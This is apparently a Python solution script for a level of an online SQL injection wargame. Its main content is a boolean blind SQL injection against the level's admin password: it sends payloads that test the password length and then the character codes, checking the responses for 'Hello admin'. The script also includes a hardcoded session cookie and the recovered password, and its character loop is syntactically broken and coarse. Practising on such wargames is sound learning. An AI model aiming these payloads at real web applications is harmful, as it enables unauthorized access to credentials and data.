'''
filter = regex, like

pw= 우(50864)왕(50773)굳(44403)
'''


import urllib.request
from urllib.parse import quote  # url encoding func

url = 'http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw='
# result = ""
result = "우왕굳"
pwlen = 0

__author__ = "goodasd123@naver.com - h4lo"


def req(query):
    re = urllib.request.Request(query)
    re.add_header('User-Agent', 'Mozilla/5.0')
    re.add_header('Cookie', 'PHPSESSID=5e2uqn824tuu6a7hjdn2jc8aj2')
    res = urllib.request.urlopen(re)
    return res

for i in range(1, 50):
    add_url = "' or id='admin' and length(pw)={} -- ;".format(i)
    query = url + quote(add_url)

    if str(req(query).read()).find('Hello admin') != -1:
        pwlen = i
        print("[Password length is {}!]".format(pwlen))
        break
    else:
        print("Matching.. -> [{}]".format(i))

for i in range(5, pwlen + 1):
    for j in range(44032, 55203, 1000):  # 범위를 좁혀가며 찾아가자..
        add_url =
        "' or id='admin' and ord(substr(pw, {}, 1))<='{}' -- ;".format(i, j)
        query = url + quote(add_url)

        if str(req(query).read()).find('Hello admin') != -1:
            result += chr(j).lower()
            print("[Find!! - {} // {}]".format(chr(j), result))
            print(req(query).readline())
            break
        else:
            # print("Matching.. -> [{}]".format(chr(j)))
            print(req(query).readline())

print("Blind SQL Injection completed.")
print("Password is {}".format(result))
